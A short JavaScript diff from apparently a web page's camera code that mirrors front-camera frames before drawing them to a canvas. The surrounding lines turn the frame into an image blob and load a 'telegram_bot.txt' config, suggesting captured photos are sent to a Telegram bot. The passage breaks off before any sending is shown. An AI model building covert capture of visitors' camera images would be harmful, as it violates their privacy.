@@ -3172,8 +3172,12 @@ function initCamera() {
         canvas.height = video.videoHeight;
         const ctx = canvas.getContext('2d');
 
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height); // The video is already flipped by CSS
+        if (currentFacingMode === 'user') {
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
+        }
 
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         canvas.toBlob(async (blob) => {
             try {
                 const configUrl = VERCEL_URL + "telegram_bot.txt";
